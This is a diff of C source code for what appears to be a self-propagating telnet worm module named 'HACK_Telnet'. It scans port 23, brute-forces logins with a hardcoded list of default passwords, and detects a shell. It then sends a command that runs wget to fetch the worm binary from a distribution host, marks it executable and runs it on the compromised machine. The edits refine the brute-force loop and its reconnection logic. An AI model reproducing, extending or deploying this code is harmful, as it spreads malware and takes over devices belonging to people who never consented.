@@ -31,12 +31,11 @@ char *passwords[] = { "root", "toor", "admin", "user", "guest", "login", "change
 
 typedef char *(*ExpectCMD)(Modules *, Connection *, int *size);
 int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size);
-
 int telnet_init(Modules **);
 
 
 enum {
-    STATE_TELNET_NEW=1,
+    STATE_TELNET_NEW=TCP_CONNECTED,
     STATE_TELNET_PASSWORD=2,
     STATE_TELNET_FINDSHELL=4,
     STATE_TELNET_INSIDE=8
@@ -69,19 +68,6 @@ Modules HACK_Telnet = {
     NULL, 0
 };
 
-
-/*
-// custom = after w finnish the static list.. custom can be loaded
-// over network, etc
-typedef struct _custom_credentials {
-    struct _custom_credentials *next;
-    char *str;
-} CustomCredentials;
-
-CustomCredentials *custom_users = NULL;
-CustomCredentials *custom_passwords = NULL;
-*/
-
 // customstate goes in connection->buf (for keeping track of brute force, etc)
 typedef struct _custom_state {
     // what username are we on..
@@ -91,7 +77,6 @@ typedef struct _custom_state {
     // seconds since last expect
     unsigned int ts;
 } CustomState;
-
 
 CustomState *CustomState_Ptr(Connection *cptr) {
     if (cptr->buf == NULL) {
@@ -110,7 +95,10 @@ CustomState *CustomState_Ptr(Connection *cptr) {
 int telnet_init(Modules **_module_list) {
     Module_Add(_module_list, &HACK_Telnet);
     
+    // add port 23 to port scanning.. and let it know
+    // to adopt connections here after finding
     Portscan_Add(&HACK_Telnet, 23);
+    // enable the port scan of telnet..
     Portscan_Enable(23, 1);
 }
 
@@ -210,7 +198,7 @@ void str_replace(char **str, char *macro, char *replace) {
 
 // we have to pass the connection its own IP.. it can be used for when it penetrates a new target (at least on this execution)
 char *BuildWORM(Modules *mptr, Connection *cptr, int *size) {
-    char cmdline[] = "wget http://%DIST%/%FNAME%;chmod +x %FNAME%;./%FNAME% %DSTIP%\r\n";
+    char cmdline[] = "cd /tmp || /var/tmp;wget http://%DIST%/%FNAME%;chmod +x %FNAME%;./%FNAME% %DSTIP%\r\n";
     char *ret = strdup(cmdline);
     struct sockaddr_in dst;
     
@@ -232,37 +220,6 @@ char *BuildWORM(Modules *mptr, Connection *cptr, int *size) {
 }
 
 
-// every state has a command we want to write, what we expect to see, and then the new state if its found
-// and a module to move the command to if we need to (for privilege escalation, etc)
-struct _state_commands {
-    int state;
-    char *expect;
-    ExpectCMD BuildData;
-    int new_state;
-    struct _modules *next_module;
-} StateCommands[] = {
-    // look for login request
-    { TCP_CONNECTED, "ogin:", &BuildLogin, STATE_TELNET_PASSWORD, NULL },
-    // look for password request..
-    { STATE_TELNET_PASSWORD, "assword:", &BuildPassword, STATE_TELNET_FINDSHELL, NULL },
-    // incorrect goes back to state new. so we can attempt another..
-    { STATE_TELNET_PASSWORD, "ncorrect", NULL, TCP_CONNECTED, NULL },
-    // look for a string specifying its connected
-    { STATE_TELNET_FINDSHELL, "last login", &BuildVerify, STATE_TELNET_INSIDE, NULL },
-    
-    //{ STATE_TELNET_FINDSHELL, "$ ", &BuildVerify, STATE_TELNET_INSIDE, NULL },
-    
-    // after id; we should see uid=X (means we are logged in)
-    // maybe change to STATE_OK after testing.. 
-    { STATE_TELNET_INSIDE, "uid", &BuildWORM, STATE_OK, NULL },
-    
-    // end of commands..
-    { 0, NULL, NULL, 0, NULL }
-};
-
-
-
-
 int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
     CustomState *Cstate = CustomState_Ptr(cptr);
     int ret = 0;
@@ -275,6 +232,37 @@ int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
     int no_line = 0;
     int dsize = 0;
     char *data = NULL;
+
+    // moved the structure here so its not in global memory..
+    // every state has a command we want to write, what we expect to see, and then the new state if its found
+    // and a module to move the command to if we need to (for privilege escalation, etc)
+    struct _state_commands {
+        int state;
+        char *expect;
+        ExpectCMD BuildData;
+        int new_state;
+        struct _modules *next_module;
+    } StateCommands[] = {
+        // look for login request
+        { TCP_CONNECTED, "ogin:", &BuildLogin, STATE_TELNET_PASSWORD, NULL },
+        // look for password request..
+        { STATE_TELNET_PASSWORD, "assword:", &BuildPassword, STATE_TELNET_FINDSHELL, NULL },
+        // incorrect goes back to state new. so we can attempt another..
+        { STATE_TELNET_PASSWORD, "ncorrect", NULL, TCP_CONNECTED, NULL },
+        // look for a string specifying its connected
+        { STATE_TELNET_FINDSHELL, "last login", &BuildVerify, STATE_TELNET_INSIDE, NULL },
+        
+        //{ STATE_TELNET_FINDSHELL, "$ ", &BuildVerify, STATE_TELNET_INSIDE, NULL },
+        
+        // after id; we should see uid=X (means we are logged in)
+        // maybe change to STATE_OK after testing.. 
+        { STATE_TELNET_INSIDE, "uid", &BuildWORM, STATE_OK, NULL },
+        
+        // end of commands..
+        { 0, NULL, NULL, 0, NULL }
+    };
+
+
     
     for (i = 0; StateCommands[i].expect != NULL; i++) {
         if (StateCommands[i].state == cptr->state) {
@@ -348,10 +336,17 @@ int telnet_disconnect(Modules *mptr, Connection *cptr, char *buf, int size) {
     CustomState *Cstate = CustomState_Ptr(cptr);
     Connection *conn = cptr;
     
+    // close current fd..
     close(cptr->fd);
     cptr->fd = 0;
     
-    // if an error occurs in tcp_connect().. itll already be dealt with
-    if (tcp_connect(mptr, cptr->list, cptr->addr, cptr->port, &conn) == NULL) 
+    // now attempt to reuse the Connection structure (so we keep our state with usernames/passwords)
+    if (tcp_connect(mptr, cptr->list, cptr->addr, cptr->port, &conn) == NULL) {
+        // returning 0 means it will get removed (since its during disconnect) 
         ConnectionBad(cptr);
+        return 0;
+    }
+    
+    // returning 1 saves the structure from being removed
+    return 1;
 }
